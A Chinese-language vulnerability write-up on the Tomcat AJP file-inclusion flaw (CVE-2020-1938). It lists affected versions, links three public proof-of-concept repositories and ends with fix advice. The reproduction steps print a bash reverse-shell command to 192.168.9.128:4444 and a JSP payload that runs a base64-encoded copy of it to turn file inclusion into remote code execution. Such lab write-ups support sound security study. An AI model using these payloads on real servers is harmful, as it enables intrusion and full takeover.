Tomcat简介


Apache与Tomcat都是Apache开源组织开发的用于处理HTTP服务的项目，两者都是免费的，都可以做为独立的Web服务器运行。

Apache Tomcat服务器存在文件包含漏洞，攻击者可利用该漏洞读取或包含 Tomcat 上所有 webapp 目录下的任意文件，如：webapp 配置文件或源代码等。

由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。



影响版本

 

   Tomcat 6.*

   Tomcat 7.* < 7.0.100

   Tomcat 8.* < 8.5.51

   Tomcat 9.* < 9.0.31



漏洞编号

 

    CNVD-2020-10487

    CVE-2020-1938



漏洞复现

  1.启动Tomcat服务并正常访问

  2.使用nmap进行端口扫描

  3.下载POC并测试

Poc1下载地址：https://github.com/0nise/CVE-2020-1938Poc2下载地址：https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfiPoc3下载地址：https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC

  4.验证poc文件

  成功执行Poc1非授权访问到指定文件

  成功执行Poc2非授权访问到指定文件

  成功执行Poc3非授权访问到指定文件

  5.利用最新版xray能够检测出漏洞

  6.利用Poc3实现文件包含RCE效果

  触发条件：需要将payload文件上传到tomcat的ROOT目录下，然后利用文件包含激活payload ,反弹命令：

bash-i >& /dev/tcp/192.168.9.128/4444 0>&

为了能正常执行需要对命令进行编码并组装成bash，推荐在线bashpayload生成：

http://www.jackson-t.ca/runtime-exec-payloads.html

最后payload文件ajp-rce.txt

<%   java.io.InputStream in = Runtime.getRuntime().exec("bash -c{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjkuMTI4LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}").getInputStream();   int a = -1;   byte[] b = new byte[2048];   out.print("<pre>");   while((a=in.read(b))!=-1){       out.println(new String(b));    }   out.print("</pre>");%>

可以看到左边nc获取到一个反弹shell，成功实现RCE效果



修复建议

 

1.临时禁用AJP协议端口，在conf/server.xml配置文件中注释掉

<Connector port="8009"protocol="AJP/1.3"redirectPort="8443" />

2.配置ajp配置中的secretRequired跟secret属性来限制认证

3.官方下载最新版下载地址：
